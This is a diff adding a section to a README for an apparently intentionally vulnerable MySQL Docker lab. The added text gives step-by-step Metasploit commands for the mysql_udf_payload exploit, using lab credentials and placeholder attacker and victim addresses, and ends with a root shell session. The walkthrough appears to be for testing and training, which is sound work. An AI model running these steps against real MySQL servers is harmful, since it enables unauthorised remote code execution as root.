@@ -27,3 +27,32 @@ These instructions will create a MySQL 5.7.20 instance inside a Docker container
     # ./setup.sh
     ```
     This script creates the following remote user: "tiaan.jerjerrod" with the password "doubleEFFORT!!"
+# Run the exploit
+This procedure was tested on Kali Linux 22.04 using Metasploit Framework 6.4.2-dev
+1. Start the MSF Console
+   ```
+   $ sudo msfconsole
+   ```
+2. Select the desired exploit
+    ```
+    > use exploit/multi/mysql/mysql_udf_payload
+    ```
+3. Set the correct options. In this example, the attacker is 1.1.1.1 and the victim is 2.2.2.2
+    ```
+    > set LHOST 1.1.1.1
+    > set SRVHOST 1.1.1.1
+    > set RHOST 2.2.2.2
+    > set USERNAME tiaan.jerjerrod
+    > set PASSWORD doubleEFFORT!!
+    > set target 1
+    > exploit
+    ```
+Note: MSF will claim that the exploit fails, but the session is still created. Not sure why this happens.
+5. Open the session (in this example, it is session 1) and test to see which user this payload is running as
+    ```
+    > sessions -i 1
+    ```
+    ```
+    > show guid
+    root
+    ```
